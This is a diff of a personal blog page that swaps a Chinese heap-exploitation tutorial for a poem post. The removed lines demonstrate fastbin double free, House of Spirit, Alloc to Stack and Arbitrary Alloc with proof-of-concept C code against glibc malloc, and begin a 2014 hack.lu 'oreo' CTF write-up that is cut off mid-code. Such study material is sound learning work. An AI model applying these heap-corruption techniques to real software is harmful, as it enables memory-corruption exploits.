@@ -6,7 +6,7 @@
   <meta charset="utf-8">
   <!-- SEO相关 -->
   
-  <link rel="canonical" href="http://example.com/2020/11/01/pwn_fastbin-attack/"/>
+  <link rel="canonical" href="http://example.com/2020/05/25/nothing_read_for_you/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -34,23 +34,21 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Fastbin Attack related - x1ngg3's blog</title>
-  <meta name="keywords" content="pwn,heap,House Of Spirit,null">
-  <meta desc name="description" content="我提莫的心态崩了啊 ಥ_ಥ - John Doe - x1ngg3's blog">
+  <title>为你读诗 - x1ngg3's blog</title>
+  <meta name="keywords" content="poem,null">
+  <meta desc name="description" content="和我一起读诗吧！ - John Doe - x1ngg3's blog">
   
 <meta property="og:type" content="article">
-<meta property="og:title" content="Fastbin Attack related">
-<meta property="og:url" content="http://example.com/2020/11/01/pwn_fastbin-attack/index.html">
+<meta property="og:title" content="为你读诗">
+<meta property="og:url" content="http://example.com/2020/05/25/nothing_read_for_you/index.html">
 <meta property="og:site_name" content="x1ngg3&#39;s blog">
-<meta property="og:description" content="我提莫的心态崩了啊 ಥ_ಥ">
+<meta property="og:description" content="和我一起读诗吧！">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2020-10-31T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-02-27T13:11:38.761Z">
+<meta property="article:published_time" content="2020-05-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-02-28T13:22:37.249Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="pwn">
-<meta property="article:tag" content="heap">
-<meta property="article:tag" content="House Of Spirit">
+<meta property="article:tag" content="poem">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1660614606622/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2446,7 +2444,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
 <div id="l_main" class=''>
   <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/01/pwn_fastbin-attack/">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2020/05/25/nothing_read_for_you/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="x1ngg3's blog">
   </span>
@@ -2467,7 +2465,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title" itemprop="name headline">
-        Fastbin Attack related
+        为你读诗
       </h1>
       <div class='new-meta-box'>
         
@@ -2489,10 +2487,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <div class='new-meta-item category'>
     <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/PWN/">PWN</a>
+    <a class="category-link" href="/categories/NOTHING/">NOTHING</a>
     
       <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/PWN/" itemprop="url"><span itemprop="name">PWN</span></a>
+        <a href="/categories/NOTHING/" itemprop="url"><span itemprop="name">NOTHING</span></a>
       </span>
     
   </div>
@@ -2503,10 +2501,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2020-11-01T00:00:00+08:00">
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2020-05-25T00:00:00+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Nov 1, 2020</p>
+    <p>发布于：May 25, 2020</p>
   </a>
 </div>
 
@@ -2529,108 +2527,186 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <p>我提莫的心态崩了啊 ಥ_ಥ</p>
+    <p>和我一起读诗吧！</p>
 <span id="more"></span>
 
-<h3 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h3><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p>
-<ol>
-<li>fastbin 的堆块被释放后 <strong>next_chunk 的 pre_inuse 位不会被清空</strong></li>
-<li>fastbin 在执行 free 的时候<strong>仅验证了 main_arena 直接指向的块</strong>，即链表指针头部的块。对于链表后面的块，并没有进行验证。</li>
-</ol>
-<p>如下代码可以跳过<code>double free</code>检测：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>效果如下：</p>
-<p><img src="https://i.loli.net/2020/12/08/4J7rMzwoHXR2Kc8.png" class="lazyload" data-srcset="https://i.loli.net/2020/12/08/4J7rMzwoHXR2Kc8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201208222201746"></p>
-<p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 </p>
-<p>也就是：main_arena&#x3D;&gt;chunk1&#x3D;&gt;chun2&#x3D;&gt;chunk1&#x3D;&gt;fd</p>
-<p>比如说对于如下代码，可以将chunk分配到bss段上</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="type">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p>
-<p>该技术的核心在于在目标位置处伪造 fastbin chunk，只要构造好数据，释放后系统会错误的将该区域作为堆块放到相应的fast bin里面，最后再分配出来的时候，就有可能改写我们目标区域从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p>
-<p>有两个例子可以帮助理解，个人觉得第二个好理解一点：</p>
-<h4 id="example-1"><a href="#example-1" class="headerlink" title="example 1"></a>example 1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="example-2"><a href="#example-2" class="headerlink" title="example 2"></a>example 2</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line">  <span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">   </span><br><span class="line">  <span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">  &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates the house of spirit attack.n&quot;</span>);</span><br><span class="line">   </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Calling malloc() once so that it sets up its memory.n&quot;</span>);</span><br><span class="line">         <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.n&quot;</span>);</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This region must contain two chunks. The first starts at %p and the second at %p.n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. n&quot;</span>);</span><br><span class="line">        fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The chunk.size of the *next* fake region has be above 2*SIZE_SZ (16 on x64) but below av-&gt;system_mem (128kb by default for the main arena) to pass the nextsize integrity checks .n&quot;</span>);</span><br><span class="line">        fake_chunks[<span class="number">9</span>] = <span class="number">0x2240</span>; <span class="comment">// nextsize</span></span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.n&quot;</span>);</span><br><span class="line">        a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Freeing the overwritten pointer.n&quot;</span>);</span><br><span class="line">        <span class="built_in">free</span>(a);</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x30): %pn&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h3><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p>
-<p>这里也就是在栈上构造出chunk的结构来骗过上帝，有时候是利用程序的流程来控制数据使符合chunk的结构。</p>
-<p><code>example</code></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *chunk1;</span><br><span class="line">    <span class="type">void</span> *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    *(<span class="type">long</span> <span class="type">long</span> *)chunk1=&amp;stack_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="Arbitrary-Alloc"><a href="#Arbitrary-Alloc" class="headerlink" title="Arbitrary Alloc"></a>Arbitrary Alloc</h3><p>Arbitrary Alloc 其实与 Alloc to stack 是完全相同的，唯一的区别是分配的目标不再是栈中。 <strong>事实上只要满足目标地址存在合法的 size 域</strong>（<strong>这个 size 域是构造的，还是自然存在的都无妨</strong>），<strong>我们可以把 chunk 分配到任意的可写内存中</strong>，比如 bss、heap、data、stack 等等。</p>
-<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#arbitrary-alloc">演示例子</a></p>
-<h3 id="2014-hack-lu-oreo"><a href="#2014-hack-lu-oreo" class="headerlink" title="2014 hack.lu oreo"></a>2014 hack.lu oreo</h3><p> 啊，怎么说呢挺难过的，还是有个地方没有弄懂是为什么，搜也搜不到（可能师傅们觉得这种简单地方应该没人不会吧(⑉･̆-･̆⑉)），我也不能一直在这里死磕浪费时间，就先这样吧。</p>
-<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>首先在<code>heap_bss</code>上保存了当前分配的堆的地址，<strong>这个地址在每次分配的时候都会更新</strong>。</p>
-<p>那程序是如何遍历这些chunk的呢，在每个chunk的<code>data+0x34</code>处保存了上一个chunk的地址，heap_bss上保存最新创建的chunk地址，以此来实现遍历。</p>
-<p>另外注意两次<code>gets</code>的大小都是56，而块的大小为<code>0x30</code>存在堆溢出。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rifle *v1; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = heap_bss;</span><br><span class="line">  heap_bss = <span class="built_in">malloc</span>(<span class="number">0x38</span>u);                     <span class="comment">// 每次分配的时候，都会更新</span></span><br><span class="line">  <span class="keyword">if</span> ( heap_bss )</span><br><span class="line">  &#123;</span><br><span class="line">    *(&amp;heap_bss-&gt;field_20 + <span class="number">2</span>) = v1;            <span class="comment">// 在每个堆的末尾，写上一个堆的地址，并非13而是0x34，看汇编</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rifle name: &quot;</span>);</span><br><span class="line">    fgets(&amp;heap_bss-&gt;field_7, <span class="number">56</span>, <span class="built_in">stdin</span>);       <span class="comment">// 会在结尾加上&#x27;\0&#x27;</span></span><br><span class="line">    vul(&amp;heap_bss-&gt;field_7);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Rifle description: &quot;</span>);</span><br><span class="line">    fgets(&amp;heap_bss-&gt;des.des, <span class="number">56</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    vul(&amp;heap_bss-&gt;des.des);</span><br><span class="line">    ++add_num;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Something terrible happened!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>这里没啥说的，就是遍历</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rifle *i; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Rifle to be ordered:\n%s\n&quot;</span>, <span class="string">&quot;===================================&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = heap_bss; i; i = *(&amp;i-&gt;field_20 + <span class="number">2</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, &amp;i-&gt;name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, i);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;===================================&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>一个依次释放块的过程，利用每个块结尾所保存的指针。这里主要如果把该指针覆盖为0的话，则遍历提前结束。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  rifle *ptr; <span class="comment">// ST18_4</span></span><br><span class="line">  rifle *v2; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v2 = heap_bss;</span><br><span class="line">  <span class="keyword">if</span> ( add_num )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( v2 )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr = v2;</span><br><span class="line">      v2 = 